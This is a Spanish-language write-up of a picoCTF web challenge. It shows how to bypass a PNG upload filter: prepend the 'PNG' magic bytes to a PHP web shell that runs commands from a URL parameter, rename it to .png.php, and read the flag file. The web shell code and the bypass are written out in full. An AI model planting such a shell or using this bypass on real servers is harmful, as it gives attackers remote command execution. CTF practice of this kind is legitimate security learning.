## Descripción
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:52628/)!
## Solución
aqui tenemos una pagina para procesar imagenes a una app con dos botones uno para seleccionar un archivo y el otro para cargarlo a la pagina.

con la url nos vamos a robots para ver las carpetas y esto encontramos.
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

revisamos /instructions.txt para buscar pistas y esto encontramos
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
sabiendo que las imágenes que carguemos seran procesadas en el propio navegador intentaremos mandar una imagen pnj pero que en realidad es un codigo php.
con el siguente comando.
```php
<?php
if(isset($_GET['cmd'])){ 
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```
la pagina parece poder subirlo pero no lo detecta como png asique hacemos una copia con la extencion png
```
┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ cp webshell.php whebshell.php.png                                                                          
┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ ls
webshell.php  whebshell.php.png

```
y lo cargamos a la pagina pero este nos indica el error
```
Error: The file is not a valid PNG image: 3c3f7068
```
por lo que los bites no coincides por lo que agregamos como encabezado al principio del codigo quedando de esta forma.
```c
┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ cat webshell.php.png 
PNG
<?php
if(isset($_GET['cmd'])){ 
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
}
?>

┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ xxd webshell.php.png 
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f52 4551 5545 5354 5b27 636d  et($_REQUEST['cm
00000020: 6427 5d29 2920 0a20 2020 2073 7973 7465  d'])) .    syste
00000030: 6d28 245f 5245 5155 4553 545b 2763 6d64  m($_REQUEST['cmd
00000040: 275d 293b 0a3f 3e0a                      ']);.?>.
                                
```
y lo volvemos a intentar cargar
```
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
```
con ese mensaje sabemos que se pudo cargar asique nos dirigimos a donde se guardo nuestra imagen con codigo en /upload/webshell.php.png ademas agregamos ?=cmd para que funcione el comando en la url.
![[Pasted image 20250930144223.png]]
ese error nos indica que no funciono porque lo esta tratando como imagen y no como codigo php la solucion es invertir la extencion del archivo para que lo reconosca correctamente
```
┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ mv webshell.php.png webshell.png.php
┌──(diego㉿Maquina-deGuerra)-[~/Documentos]
└─$ ls
webshell.php  webshell.png.php

```
y lo volvemos a cargar he intentar ejecutar al conseguirlo nos aparece el codigo y entonces agregamos =cmd ls ..

```
PNG 
HFQWKODGMIYTO.txt 
index.php 
instructions.txt 
robots.txt uploads
```

al ver esos archivos de tecto el mas sospechoso es el llamado HFQWKODGMIYTO.txt entonces usamos un cat ../HFQWKODGMIYTO.txt para ver su contenido.
```
PNG /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
```  
y asi encontramos la bandera
## Referencias
